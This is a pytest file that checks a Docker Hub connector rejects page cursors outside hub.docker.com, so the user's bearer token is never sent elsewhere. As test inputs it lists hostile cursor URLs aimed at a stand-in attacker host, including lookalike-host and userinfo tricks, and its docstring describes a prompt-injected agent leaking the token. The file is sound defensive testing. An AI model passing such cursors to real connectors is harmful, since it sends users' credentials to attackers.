"""Tests for the Docker Hub connector's cursor handling, using respx.

Docker Hub pages with a ``next`` field holding a full
``https://hub.docker.com/v2/...`` URL. The list actions accept it back as
``page``, and ``_get_page`` requests it through a client whose default headers
carry ``Authorization: Bearer <token>``.

These tests pin that only a Docker Hub URL is ever sent with that header. Before
the fix, any caller (or a prompt-injected agent) could pass
``page="https://attacker.example/..."`` and the connector delivered the user's
token there.
"""

from __future__ import annotations

import httpx
import pytest
import pytest_asyncio
import respx

from toolsconnector.connectors.dockerhub import DockerHub
from toolsconnector.errors import ValidationError

_API = "https://hub.docker.com/v2"
_TOKEN = "fake-dockerhub-token"


@pytest_asyncio.fixture
async def dockerhub() -> DockerHub:
    """Docker Hub connector with a bare token (no colon, so no login call)."""
    connector = DockerHub(credentials=_TOKEN)
    await connector._setup()
    yield connector
    await connector._teardown()


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "page",
    [
        "https://attacker.example/steal",
        "http://hub.docker.com/v2/repositories/acme/?page=2",  # downgrade to http
        "https://hub.docker.com.attacker.example/v2/repositories/acme/",  # lookalike host
        "https://hub.docker.com@attacker.example/v2/repositories/acme/",  # userinfo trick
        "https://hub.docker.com:8443/v2/repositories/acme/",  # other port
    ],
)
async def test_list_repos_refuses_a_page_cursor_off_docker_hub(
    dockerhub: DockerHub, page: str
) -> None:
    """A foreign page cursor must be refused before any request is sent.

    Fails on the unfixed code: the request goes out, carrying the bearer token.
    """
    with respx.mock(assert_all_called=False) as respx_mock:
        catch_all = respx_mock.route().mock(return_value=httpx.Response(200, json={}))

        with pytest.raises(ValidationError):
            await dockerhub.alist_repos(namespace="acme", page=page)

    leaked = [c.request for c in catch_all.calls if "authorization" in c.request.headers]
    assert catch_all.call_count == 0, f"request sent to {catch_all.calls[0].request.url}" + (
        " WITH the bearer token" if leaked else ""
    )


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("action", "kwargs"),
    [
        ("alist_tags", {"namespace": "acme", "repo": "api"}),
        ("asearch_repos", {"query": "acme"}),
    ],
)
async def test_every_paged_action_refuses_a_foreign_cursor(
    dockerhub: DockerHub, action: str, kwargs: dict
) -> None:
    """list_tags and search_repos share the same cursor path; both must refuse."""
    with respx.mock(assert_all_called=False) as respx_mock:
        catch_all = respx_mock.route().mock(return_value=httpx.Response(200, json={}))

        with pytest.raises(ValidationError):
            await getattr(dockerhub, action)(**kwargs, page="https://attacker.example/x")

    assert catch_all.call_count == 0


@pytest.mark.asyncio
async def test_real_docker_hub_next_url_still_pages(dockerhub: DockerHub) -> None:
    """Docker Hub's own `next` URL must keep working, both via anext_page() and by hand."""
    next_url = f"{_API}/repositories/acme/?page=2&page_size=1"
    with respx.mock(base_url=_API) as respx_mock:
        route = respx_mock.get(url__regex=r"https://hub\.docker\.com/v2/repositories/acme/.*").mock(
            side_effect=[
                httpx.Response(
                    200,
                    json={
                        "results": [{"name": "r1", "namespace": "acme"}],
                        "next": next_url,
                        "count": 2,
                    },
                ),
                httpx.Response(
                    200,
                    json={
                        "results": [{"name": "r2", "namespace": "acme"}],
                        "next": None,
                        "count": 2,
                    },
                ),
                httpx.Response(
                    200,
                    json={
                        "results": [{"name": "r2", "namespace": "acme"}],
                        "next": None,
                        "count": 2,
                    },
                ),
            ]
        )

        page1 = await dockerhub.alist_repos(namespace="acme", limit=1)
        assert page1.page_state.cursor == next_url

        page2 = await page1.anext_page()
        assert page2 is not None
        assert [r.name for r in page2.items] == ["r2"]
        assert page2.has_more is False

        # Passing the cursor back by hand takes the same path.
        manual = await dockerhub.alist_repos(namespace="acme", page=next_url)
        assert [r.name for r in manual.items] == ["r2"]

    for call in route.calls[1:]:
        assert str(call.request.url) == next_url
        assert call.request.headers["authorization"] == f"Bearer {_TOKEN}"
